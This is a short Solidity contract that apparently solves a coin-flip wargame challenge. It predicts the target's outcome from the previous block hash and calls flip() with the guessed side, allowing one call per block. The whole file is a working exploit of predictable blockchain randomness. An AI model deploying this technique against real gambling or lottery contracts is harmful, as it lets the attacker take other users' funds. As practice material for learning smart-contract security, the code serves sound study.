// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import '../coinFlip/CoinFlip.sol';

contract CoinFlipHack {

  using SafeMath for uint256;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip coinFlip;

  constructor(address coinFlipAddress){
    coinFlip = CoinFlip(coinFlipAddress);
  }

  function callFlip() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;

    uint256 guess = blockValue.div(FACTOR);
    bool side = guess == 1 ? true : false;
    coinFlip.flip(side);
  }
}